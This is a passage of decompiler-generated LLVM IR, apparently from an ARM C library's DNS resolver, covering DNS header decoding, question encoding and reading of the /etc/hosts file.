  %v2_1e70c = icmp eq i32 %v2_1e708, 0
  %v1_1e710 = urem i32 %v5_1e708, 16
  %v0_1e71c = select i1 %v2_1e70c, i32 0, i32 128
  %v2_1e71c = or i32 %v1_1e710, %v0_1e71c
  %v1_1e720 = trunc i32 %v2_1e71c to i8
  %v2_1e720 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e720 = add i32 %v2_1e720, 3
  %v4_1e720 = inttoptr i32 %v3_1e720 to i8*
  store i8 %v1_1e720, i8* %v4_1e720, align 1
  %v0_1e724 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e724 = add i32 %v0_1e724, 33
  %v2_1e724 = inttoptr i32 %v1_1e724 to i8*
  %v3_1e724 = load i8, i8* %v2_1e724, align 1
  %v2_1e728 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e728 = add i32 %v2_1e728, 4
  %v4_1e728 = inttoptr i32 %v3_1e728 to i8*
  store i8 %v3_1e724, i8* %v4_1e728, align 1
  %v0_1e72c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e72c = add i32 %v0_1e72c, 32
  %v2_1e72c = inttoptr i32 %v1_1e72c to i32*
  %v3_1e72c = load i32, i32* %v2_1e72c, align 4
  %v1_1e730 = trunc i32 %v3_1e72c to i8
  %v2_1e730 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e730 = add i32 %v2_1e730, 5
  %v4_1e730 = inttoptr i32 %v3_1e730 to i8*
  store i8 %v1_1e730, i8* %v4_1e730, align 1
  %v0_1e734 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e734 = add i32 %v0_1e734, 37
  %v2_1e734 = inttoptr i32 %v1_1e734 to i8*
  %v3_1e734 = load i8, i8* %v2_1e734, align 1
  %v2_1e738 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e738 = add i32 %v2_1e738, 6
  %v4_1e738 = inttoptr i32 %v3_1e738 to i8*
  store i8 %v3_1e734, i8* %v4_1e738, align 1
  %v0_1e73c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e73c = add i32 %v0_1e73c, 36
  %v2_1e73c = inttoptr i32 %v1_1e73c to i32*
  %v3_1e73c = load i32, i32* %v2_1e73c, align 4
  %v1_1e740 = trunc i32 %v3_1e73c to i8
  %v2_1e740 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e740 = add i32 %v2_1e740, 7
  %v4_1e740 = inttoptr i32 %v3_1e740 to i8*
  store i8 %v1_1e740, i8* %v4_1e740, align 1
  %v0_1e744 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e744 = add i32 %v0_1e744, 41
  %v2_1e744 = inttoptr i32 %v1_1e744 to i8*
  %v3_1e744 = load i8, i8* %v2_1e744, align 1
  %v2_1e748 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e748 = add i32 %v2_1e748, 8
  %v4_1e748 = inttoptr i32 %v3_1e748 to i8*
  store i8 %v3_1e744, i8* %v4_1e748, align 1
  %v0_1e74c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e74c = add i32 %v0_1e74c, 40
  %v2_1e74c = inttoptr i32 %v1_1e74c to i32*
  %v3_1e74c = load i32, i32* %v2_1e74c, align 4
  %v1_1e750 = trunc i32 %v3_1e74c to i8
  %v2_1e750 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e750 = add i32 %v2_1e750, 9
  %v4_1e750 = inttoptr i32 %v3_1e750 to i8*
  store i8 %v1_1e750, i8* %v4_1e750, align 1
  %v0_1e754 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e754 = add i32 %v0_1e754, 45
  %v2_1e754 = inttoptr i32 %v1_1e754 to i8*
  %v3_1e754 = load i8, i8* %v2_1e754, align 1
  %v2_1e758 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e758 = add i32 %v2_1e758, 10
  %v4_1e758 = inttoptr i32 %v3_1e758 to i8*
  store i8 %v3_1e754, i8* %v4_1e758, align 1
  %v0_1e75c = load i32, i32* %ip.global-to-local, align 4
  %v1_1e75c = add i32 %v0_1e75c, 44
  %v2_1e75c = inttoptr i32 %v1_1e75c to i32*
  %v3_1e75c = load i32, i32* %v2_1e75c, align 4
  %v1_1e760 = trunc i32 %v3_1e75c to i8
  %v2_1e760 = load i32, i32* %lr.global-to-local, align 4
  %v3_1e760 = add i32 %v2_1e760, 11
  %v4_1e760 = inttoptr i32 %v3_1e760 to i8*
  store i8 %v1_1e760, i8* %v4_1e760, align 1
  %v2_1e768.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1e768

dec_label_pc_1e768:                               ; preds = %entry, %bb17
  %v2_1e768 = phi i32 [ %v2_1e768.pre, %bb17 ], [ %v0_1e688, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_1e768, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1e6ac, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1e768, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1e770 = load i8, i8* %arg1, align 1
  %v4_1e770 = zext i8 %v3_1e770 to i32
  %v2_1e774 = add i32 %tmp, 1
  %v3_1e774 = inttoptr i32 %v2_1e774 to i8*
  %v4_1e774 = load i8, i8* %v3_1e774, align 1
  %v5_1e774 = zext i8 %v4_1e774 to i32
  %v4_1e778 = mul nuw nsw i32 %v4_1e770, 256
  %v5_1e778 = or i32 %v5_1e774, %v4_1e778
  %v2_1e77c = inttoptr i32 %arg2 to i32*
  store i32 %v5_1e778, i32* %v2_1e77c, align 4
  %v2_1e780 = add i32 %tmp, 2
  %v3_1e780 = inttoptr i32 %v2_1e780 to i8*
  %v4_1e780 = load i8, i8* %v3_1e780, align 1
  %tmp3 = icmp slt i8 %v4_1e780, 0
  %v3_1e784 = zext i1 %tmp3 to i32
  %v2_1e788 = add i32 %arg2, 4
  %v3_1e788 = inttoptr i32 %v2_1e788 to i32*
  store i32 %v3_1e784, i32* %v3_1e788, align 4
  %v4_1e78c = load i8, i8* %v3_1e780, align 1
  %div = udiv i8 %v4_1e78c, 8
  %tmp4 = urem i8 %div, 16
  %v1_1e794 = zext i8 %tmp4 to i32
  %v2_1e798 = add i32 %arg2, 8
  %v3_1e798 = inttoptr i32 %v2_1e798 to i32*
  store i32 %v1_1e794, i32* %v3_1e798, align 4
  %v4_1e79c = load i8, i8* %v3_1e780, align 1
  %div1 = udiv i8 %v4_1e79c, 4
  %tmp5 = urem i8 %div1, 2
  %v1_1e7a4 = zext i8 %tmp5 to i32
  %v2_1e7a8 = add i32 %arg2, 12
  %v3_1e7a8 = inttoptr i32 %v2_1e7a8 to i32*
  store i32 %v1_1e7a4, i32* %v3_1e7a8, align 4
  %v4_1e7ac = load i8, i8* %v3_1e780, align 1
  %div2 = udiv i8 %v4_1e7ac, 2
  %tmp6 = urem i8 %div2, 2
  %v1_1e7b4 = zext i8 %tmp6 to i32
  %v2_1e7b8 = add i32 %arg2, 16
  %v3_1e7b8 = inttoptr i32 %v2_1e7b8 to i32*
  store i32 %v1_1e7b4, i32* %v3_1e7b8, align 4
  %v4_1e7bc = load i8, i8* %v3_1e780, align 1
  %tmp7 = urem i8 %v4_1e7bc, 2
  %v1_1e7c0 = zext i8 %tmp7 to i32
  %v2_1e7c4 = add i32 %arg2, 20
  %v3_1e7c4 = inttoptr i32 %v2_1e7c4 to i32*
  store i32 %v1_1e7c0, i32* %v3_1e7c4, align 4
  %v2_1e7c8 = add i32 %tmp, 3
  %v3_1e7c8 = inttoptr i32 %v2_1e7c8 to i8*
  %v4_1e7c8 = load i8, i8* %v3_1e7c8, align 1
  %tmp8 = icmp slt i8 %v4_1e7c8, 0
  %v3_1e7cc = zext i1 %tmp8 to i32
  %v2_1e7d0 = add i32 %arg2, 24
  %v3_1e7d0 = inttoptr i32 %v2_1e7d0 to i32*
  store i32 %v3_1e7cc, i32* %v3_1e7d0, align 4
  %v4_1e7d4 = load i8, i8* %v3_1e7c8, align 1
  %tmp9 = urem i8 %v4_1e7d4, 16
  %v1_1e7d8 = zext i8 %tmp9 to i32
  %v2_1e7dc = add i32 %arg2, 28
  %v3_1e7dc = inttoptr i32 %v2_1e7dc to i32*
  store i32 %v1_1e7d8, i32* %v3_1e7dc, align 4
  %v2_1e7e0 = add i32 %tmp, 4
  %v3_1e7e0 = inttoptr i32 %v2_1e7e0 to i8*
  %v4_1e7e0 = load i8, i8* %v3_1e7e0, align 1
  %v5_1e7e0 = zext i8 %v4_1e7e0 to i32
  %v2_1e7e4 = add i32 %tmp, 5
  %v3_1e7e4 = inttoptr i32 %v2_1e7e4 to i8*
  %v4_1e7e4 = load i8, i8* %v3_1e7e4, align 1
  %v5_1e7e4 = zext i8 %v4_1e7e4 to i32
  %v4_1e7e8 = mul nuw nsw i32 %v5_1e7e0, 256
  %v5_1e7e8 = or i32 %v5_1e7e4, %v4_1e7e8
  %v2_1e7ec = add i32 %arg2, 32
  %v3_1e7ec = inttoptr i32 %v2_1e7ec to i32*
  store i32 %v5_1e7e8, i32* %v3_1e7ec, align 4
  %v2_1e7f0 = add i32 %tmp, 6
  %v3_1e7f0 = inttoptr i32 %v2_1e7f0 to i8*
  %v4_1e7f0 = load i8, i8* %v3_1e7f0, align 1
  %v5_1e7f0 = zext i8 %v4_1e7f0 to i32
  %v2_1e7f4 = add i32 %tmp, 7
  %v3_1e7f4 = inttoptr i32 %v2_1e7f4 to i8*
  %v4_1e7f4 = load i8, i8* %v3_1e7f4, align 1
  %v5_1e7f4 = zext i8 %v4_1e7f4 to i32
  %v4_1e7f8 = mul nuw nsw i32 %v5_1e7f0, 256
  %v5_1e7f8 = or i32 %v5_1e7f4, %v4_1e7f8
  %v2_1e7fc = add i32 %arg2, 36
  %v3_1e7fc = inttoptr i32 %v2_1e7fc to i32*
  store i32 %v5_1e7f8, i32* %v3_1e7fc, align 4
  %v2_1e800 = add i32 %tmp, 8
  %v3_1e800 = inttoptr i32 %v2_1e800 to i8*
  %v4_1e800 = load i8, i8* %v3_1e800, align 1
  %v5_1e800 = zext i8 %v4_1e800 to i32
  %v2_1e804 = add i32 %tmp, 9
  %v3_1e804 = inttoptr i32 %v2_1e804 to i8*
  %v4_1e804 = load i8, i8* %v3_1e804, align 1
  %v5_1e804 = zext i8 %v4_1e804 to i32
  %v4_1e808 = mul nuw nsw i32 %v5_1e800, 256
  %v5_1e808 = or i32 %v5_1e804, %v4_1e808
  %v2_1e80c = add i32 %arg2, 40
  %v3_1e80c = inttoptr i32 %v2_1e80c to i32*
  store i32 %v5_1e808, i32* %v3_1e80c, align 4
  %v2_1e810 = add i32 %tmp, 11
  %v3_1e810 = inttoptr i32 %v2_1e810 to i8*
  %v4_1e810 = load i8, i8* %v3_1e810, align 1
  %v5_1e810 = zext i8 %v4_1e810 to i32
  %v2_1e814 = add i32 %tmp, 10
  %v3_1e814 = inttoptr i32 %v2_1e814 to i8*
  %v4_1e814 = load i8, i8* %v3_1e814, align 1
  %v5_1e814 = zext i8 %v4_1e814 to i32
  %v4_1e818 = mul nuw nsw i32 %v5_1e814, 256
  %v5_1e818 = or i32 %v4_1e818, %v5_1e810
  %v2_1e81c = add i32 %arg2, 44
  %v3_1e81c = inttoptr i32 %v2_1e81c to i32*
  store i32 %v5_1e818, i32* %v3_1e81c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 15, 16, 0, 21, 22, 2, 17, 13, 42, 18, 19, 1, 20, 3, 26, 27, 28, 29, 30, 31, 23, 24, 25, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12 }
  uselistorder i32 11, { 14, 15, 7, 8, 16, 9, 10, 11, 24, 17, 4, 5, 6, 18, 19, 20, 21, 22, 23, 0, 12, 3, 2, 1, 13 }
  uselistorder i32 40, { 18, 19, 22, 1, 5, 23, 20, 4, 6, 24, 2, 21, 7, 8, 9, 10, 11, 3, 13, 14, 12, 15, 0, 25, 26, 27, 28, 29, 16, 17 }
  uselistorder i32 36, { 43, 44, 47, 48, 49, 50, 7, 45, 8, 40, 9, 41, 10, 11, 0, 1, 12, 2, 4, 46, 13, 14, 15, 19, 16, 20, 17, 21, 18, 22, 30, 31, 29, 32, 33, 34, 35, 36, 37, 24, 25, 26, 27, 23, 28, 5, 38, 3, 51, 52, 6, 42, 39 }
  uselistorder i32 7, { 17, 18, 12, 0, 1, 9, 10, 2, 22, 19, 20, 21, 3, 4, 5, 13, 14, 6, 15, 7, 11, 8, 16 }
  uselistorder i32 28, { 60, 11, 13, 63, 12, 66, 67, 72, 74, 75, 14, 7, 16, 15, 73, 17, 18, 68, 1, 76, 61, 62, 51, 19, 52, 20, 87, 21, 64, 65, 22, 59, 77, 23, 2, 69, 70, 24, 25, 26, 28, 27, 29, 3, 30, 78, 31, 71, 32, 33, 34, 35, 36, 37, 38, 4, 39, 40, 41, 8, 42, 5, 79, 80, 81, 82, 83, 84, 85, 0, 86, 6, 53, 54, 55, 9, 10, 56, 47, 46, 44, 45, 50, 48, 49, 57, 43, 58 }
  uselistorder i8 2, { 1, 2, 3, 4, 7, 5, 8, 6, 0, 10, 9 }
  uselistorder i8 4, { 2, 0, 1, 3 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1e824 = load i32, i32* @r4, align 4
  store i32 %v3_1e824, i32* %stack_var_-16, align 4
  %v9_1e824 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1e82c = load i32, i32* %arg1, align 4
  store i32 %v2_1e82c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1e838 = inttoptr i32 %v2_1e82c to i8*
  %v2_1e838 = call i32 @__encode_dotted(i8* %v1_1e838)
  store i32 %v2_1e838, i32* %r0.global-to-local, align 4
  %v1_1e83c = icmp slt i32 %v2_1e838, 0
  br i1 %v1_1e83c, label %dec_label_pc_1e87c, label %dec_label_pc_1e844

dec_label_pc_1e844:                               ; preds = %entry
  %v1_1e844 = load i32, i32* @r5, align 4
  %v2_1e844 = sub i32 %v1_1e844, %v2_1e838
  %v7_1e84c = icmp slt i32 %v2_1e844, 4
  br i1 %v7_1e84c, label %bb, label %dec_label_pc_1e854

bb:                                               ; preds = %dec_label_pc_1e844
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e87c

dec_label_pc_1e854:                               ; preds = %dec_label_pc_1e844
  %v0_1e854 = load i32, i32* @r4, align 4
  %v1_1e854 = add i32 %v0_1e854, 5
  %v2_1e854 = inttoptr i32 %v1_1e854 to i8*
  %v3_1e854 = load i8, i8* %v2_1e854, align 1
  %v2_1e858 = load i32, i32* @r6, align 4
  %v4_1e858 = add i32 %v2_1e858, %v2_1e838
  %v5_1e858 = inttoptr i32 %v4_1e858 to i8*
  store i8 %v3_1e854, i8* %v5_1e858, align 1
  %v0_1e85c = load i32, i32* @r4, align 4
  %v1_1e85c = add i32 %v0_1e85c, 4
  %v2_1e85c = inttoptr i32 %v1_1e85c to i32*
  %v3_1e85c = load i32, i32* %v2_1e85c, align 4
  %v0_1e860 = load i32, i32* @r6, align 4
  %v1_1e860 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e860 = add i32 %v1_1e860, %v0_1e860
  store i32 %v2_1e860, i32* %r2.global-to-local, align 4
  %v1_1e864 = trunc i32 %v3_1e85c to i8
  %v3_1e864 = add i32 %v2_1e860, 1
  %v4_1e864 = inttoptr i32 %v3_1e864 to i8*
  store i8 %v1_1e864, i8* %v4_1e864, align 1
  %v0_1e868 = load i32, i32* @r4, align 4
  %v1_1e868 = add i32 %v0_1e868, 9
  %v2_1e868 = inttoptr i32 %v1_1e868 to i8*
  %v3_1e868 = load i8, i8* %v2_1e868, align 1
  %v2_1e86c = load i32, i32* %r2.global-to-local, align 4
  %v3_1e86c = add i32 %v2_1e86c, 2
  %v4_1e86c = inttoptr i32 %v3_1e86c to i8*
  store i8 %v3_1e868, i8* %v4_1e86c, align 1
  %v0_1e870 = load i32, i32* @r4, align 4
  %v1_1e870 = add i32 %v0_1e870, 8
  %v2_1e870 = inttoptr i32 %v1_1e870 to i32*
  %v3_1e870 = load i32, i32* %v2_1e870, align 4
  %v1_1e874 = trunc i32 %v3_1e870 to i8
  %v2_1e874 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e874 = add i32 %v2_1e874, 3
  %v4_1e874 = inttoptr i32 %v3_1e874 to i8*
  store i8 %v1_1e874, i8* %v4_1e874, align 1
  %v0_1e878 = load i32, i32* %r0.global-to-local, align 4
  %v1_1e878 = add i32 %v0_1e878, 4
  store i32 %v1_1e878, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e87c

dec_label_pc_1e87c:                               ; preds = %bb, %entry, %dec_label_pc_1e854
  %v1_1e880 = phi i32 [ -1, %bb ], [ %v2_1e838, %entry ], [ %v1_1e878, %dec_label_pc_1e854 ]
  %v2_1e87c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e87c, i32* @r4, align 4
  store i32 %v9_1e824, i32* @r6, align 4
  ret i32 %v1_1e880

; uselistorder directives
  uselistorder i32 %v2_1e838, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 29, 30, 31, 34, 35, 17, 33, 32, 28, 23, 24, 18, 36, 1, 37, 38, 19, 20, 25, 39, 40, 41, 42, 21, 22, 0, 16, 13, 14, 15, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 26, 27 }
  uselistorder i32 5, { 22, 23, 24, 9, 18, 0, 10, 25, 11, 5, 19, 12, 20, 14, 13, 6, 29, 1, 7, 26, 8, 2, 27, 28, 15, 3, 4, 16, 17, 21 }
  uselistorder label %dec_label_pc_1e87c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -32860), i32* @r0, align 4
  %v1_1e89c = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -32860))
  ret i32 %v1_1e89c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1e8b4 = load i32, i32* @r4, align 4
  %v6_1e8b4 = load i32, i32* @r5, align 4
  %v9_1e8b4 = load i32, i32* @r6, align 4
  %v12_1e8b4 = load i32, i32* @r7, align 4
  %v15_1e8b4 = load i32, i32* @r8, align 4
  %v18_1e8b4 = load i32, i32* @sb, align 4
  %v21_1e8b4 = load i32, i32* @sl, align 4
  %v24_1e8b4 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  %v2_1e8dc = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_1e8dc, align 4
  %v0_1e8e0 = load i32, i32* @r0, align 4
  store i32 %v0_1e8e0, i32* @r6, align 4
  %v0_1e8e4 = load i32, i32* @r1, align 4
  %v0_1e8e8 = load i32, i32* @r2, align 4
  store i32 %v0_1e8e8, i32* @r8, align 4
  %v0_1e8ec = load i32, i32* @r3, align 4
  store i32 %v0_1e8ec, i32* @fp, align 4
  %v3_1e8f0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1e8f0, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_1e8fc

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1ea9c

dec_label_pc_1e8fc:                               ; preds = %entry
  %v2_1e8fc = icmp eq i32 %v0_1e8e0, 0
  br i1 %v2_1e8fc, label %dec_label_pc_1e904, label %dec_label_pc_1e924

dec_label_pc_1e904:                               ; preds = %dec_label_pc_1e8fc
  %v0_1e904 = call i32 @__open_etc_hosts()
  store i32 %v0_1e904, i32* @r6, align 4
  %v2_1e908 = icmp eq i32 %v0_1e904, 0
  br i1 %v2_1e908, label %dec_label_pc_1e910, label %dec_label_pc_1e924

dec_label_pc_1e910:                               ; preds = %dec_label_pc_1e904
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_1e914 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_1e914, align 4
  %v0_1e918 = call i32 @__GI___errno_location()
  %v1_1e91c = inttoptr i32 %v0_1e918 to i32*
  %v2_1e91c = load i32, i32* %v1_1e91c, align 4
  store i32 %v2_1e91c, i32* @sb, align 4
  br label %dec_label_pc_1ea9c

dec_label_pc_1e924:                               ; preds = %dec_label_pc_1e904, %dec_label_pc_1e8fc
  %v1_1e944 = phi i32 [ %v0_1e904, %dec_label_pc_1e904 ], [ %v0_1e8e0, %dec_label_pc_1e8fc ]
  %v0_1e928 = load i32, i32* @r4, align 4
  %v2_1e928 = add i32 %v0_1e928, -32848
  store i32 %v2_1e928, i32* @r4, align 4
  %v2_1e92c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_1e944 = add i32 %v1_1e944, 8
  %v3_1e944 = inttoptr i32 %v2_1e944 to i32*
  store i32 48, i32* %v3_1e944, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_1e94c = load i32, i32* @r5, align 4
  %v1_1e94c = add i32 %v0_1e94c, -48
  store i32 %v1_1e94c, i32* %r1.global-to-local, align 4
  %v0_1e950 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e950 = add i32 %v0_1e950, 24
  store i32 %v1_1e950, i32* @ip, align 4
  %v0_1e954 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1e954, i32* @sb, align 4
  %v0_1e958 = load i32, i32* @lr, align 4
  %v1_1e958 = add i32 %v0_1e958, 32
  store i32 %v1_1e958, i32* @sl, align 4
  %v1_1e95c = load i32, i32* @r6, align 4
  %v2_1e95c = add i32 %v1_1e95c, 16
  %v3_1e95c = inttoptr i32 %v2_1e95c to i32*
  store i32 %v1_1e94c, i32* %v3_1e95c, align 4
  %v0_1e960 = load i32, i32* @r4, align 4
  %v0_1e964 = load i32, i32* @ip, align 4
  store i32 %v0_1e964, i32* %stack_var_-64, align 4
  %v0_1e968 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e968 = load i32, i32* %r3.global-to-local, align 4
  %v2_1e968 = inttoptr i32 %v1_1e968 to i32*
  store i32 %v0_1e968, i32* %v2_1e968, align 4
  %v0_1e96c = load i32, i32* @lr, align 4
  %v1_1e96c = load i32, i32* @r6, align 4
  %v2_1e96c = add i32 %v1_1e96c, 4
  %v3_1e96c = inttoptr i32 %v2_1e96c to i32*
  store i32 %v0_1e96c, i32* %v3_1e96c, align 4
  %v2_1e99c = inttoptr i32 %v0_1e8e4 to i8*
  br label %dec_label_pc_1ea70

dec_label_pc_1e974:                               ; preds = %dec_label_pc_1ea70
  %v3_1e974 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1e974, i32* %r1.global-to-local, align 4
  %v0_1e978 = load i32, i32* @fp, align 4
  %v7_1e978 = icmp eq i32 %v0_1e978, 1
  %v1_1e97c = add i32 %v3_1e974, 4
  store i32 %v1_1e97c, i32* @r5, align 4
  %v1_1e980 = load i32, i32* @r7, align 4
  %v2_1e980 = add i32 %v1_1e980, 4
  %v3_1e980 = inttoptr i32 %v2_1e980 to i32*
  store i32 %v1_1e97c, i32* %v3_1e980, align 4
  br i1 %v7_1e978, label %dec_label_pc_1ea9c, label %dec_label_pc_1e988

dec_label_pc_1e988:                               ; preds = %dec_label_pc_1e974
  %v0_1e988 = load i32, i32* @fp, align 4
  %v7_1e988 = icmp eq i32 %v0_1e988, 2
  br i1 %v7_1e988, label %dec_label_pc_1e994, label %dec_label_pc_1e9b8.preheader

dec_label_pc_1e9b8.preheader:                     ; preds = %dec_label_pc_1e988
  %v1_1e98c = load i32, i32* @r5, align 4
  %v1_1e9b825 = inttoptr i32 %v1_1e98c to i32*
  %v2_1e9b826 = load i32, i32* %v1_1e9b825, align 4
  store i32 %v2_1e9b826, i32* %r3.global-to-local, align 4
  store i32 %v2_1e9b826, i32* %r1.global-to-local, align 4
  %v2_1e9bc28 = icmp eq i32 %v2_1e9b826, 0
  %v1_1e9c429 = add i32 %v1_1e98c, 4
  store i32 %v1_1e9c429, i32* @r4, align 4
  br i1 %v2_1e9bc28, label %dec_label_pc_1ea70, label %dec_label_pc_1e9ac

dec_label_pc_1e994:                               ; preds = %dec_label_pc_1e988
  %v0_1e994 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e994 = inttoptr i32 %v0_1e994 to i32*
  %v2_1e994 = load i32, i32* %v1_1e994, align 4
  store i32 %v2_1e994, i32* @r1, align 4
  %v3_1e99c = call i32 @__GI_strcoll(i8* %v2_1e99c, i32 %v2_1e994)
  %v2_1e9a0 = icmp eq i32 %v3_1e99c, 0
  br i1 %v2_1e9a0, label %dec_label_pc_1e9d0, label %dec_label_pc_1ea70

dec_label_pc_1e9ac:                               ; preds = %dec_label_pc_1e9b8.preheader, %dec_label_pc_1e9ac.dec_label_pc_1e9b8_crit_edge
  %v2_1e9b830 = phi i32 [ %v2_1e9b8, %dec_label_pc_1e9ac.dec_label_pc_1e9b8_crit_edge ], [ %v2_1e9b826, %dec_label_pc_1e9b8.preheader ]
  %v3_1e9ac = call i32 @__GI_strcasecmp(i8* %v2_1e99c, i32 %v2_1e9b830)
  %v2_1e9b0 = icmp eq i32 %v3_1e9ac, 0
  br i1 %v2_1e9b0, label %dec_label_pc_1e9d0, label %dec_label_pc_1e9ac.dec_label_pc_1e9b8_crit_edge

dec_label_pc_1e9ac.dec_label_pc_1e9b8_crit_edge:  ; preds = %dec_label_pc_1e9ac
  %v0_1e9b8.pre = load i32, i32* @r4, align 4
  %v1_1e9b8 = inttoptr i32 %v0_1e9b8.pre to i32*
  %v2_1e9b8 = load i32, i32* %v1_1e9b8, align 4
  store i32 %v2_1e9b8, i32* %r3.global-to-local, align 4
  store i32 %v2_1e9b8, i32* %r1.global-to-local, align 4
  %v2_1e9bc = icmp eq i32 %v2_1e9b8, 0
  %v1_1e9c4 = add i32 %v0_1e9b8.pre, 4
  store i32 %v1_1e9c4, i32* @r4, align 4
  br i1 %v2_1e9bc, label %dec_label_pc_1ea70, label %dec_label_pc_1e9ac

dec_label_pc_1e9d0:                               ; preds = %dec_label_pc_1e9ac, %dec_label_pc_1e994
  %v0_1e9d0 = load i32, i32* @r5, align 4
  %v1_1e9d0 = inttoptr i32 %v0_1e9d0 to i32*
  %v2_1e9d0 = load i32, i32* %v1_1e9d0, align 4
  store i32 %v2_1e9d0, i32* %r3.global-to-local, align 4
  %v4_1e9d0 = add i32 %v0_1e9d0, 4
  store i32 %v4_1e9d0, i32* @r5, align 4
  %v2_1e9d4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1e9d4, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1e9dc = load i32, i32* @r7, align 4
  %v2_1e9dc = inttoptr i32 %v1_1e9dc to i32*
  store i32 %v2_1e9d0, i32* %v2_1e9dc, align 4
  %v0_1e9e0 = load i32, i32* @lr, align 4
  %v1_1e9e0 = load i32, i32* @ip, align 4
  %v2_1e9e0 = add i32 %v1_1e9e0, 4
  %v3_1e9e0 = inttoptr i32 %v2_1e9e0 to i32*
  store i32 %v0_1e9e0, i32* %v3_1e9e0, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_1e9e8 = load i32, i32* @r8, align 4
  %v7_1e9e8 = icmp eq i32 %v0_1e9e8, 2
  %v0_1e9ec = load i32, i32* @r5, align 4
  %v1_1e9ec = load i32, i32* @r7, align 4
  %v2_1e9ec = add i32 %v1_1e9ec, 4
  %v3_1e9ec = inttoptr i32 %v2_1e9ec to i32*
  store i32 %v0_1e9ec, i32* %v3_1e9ec, align 4
  %v0_1e9f0 = load i32, i32* @ip, align 4
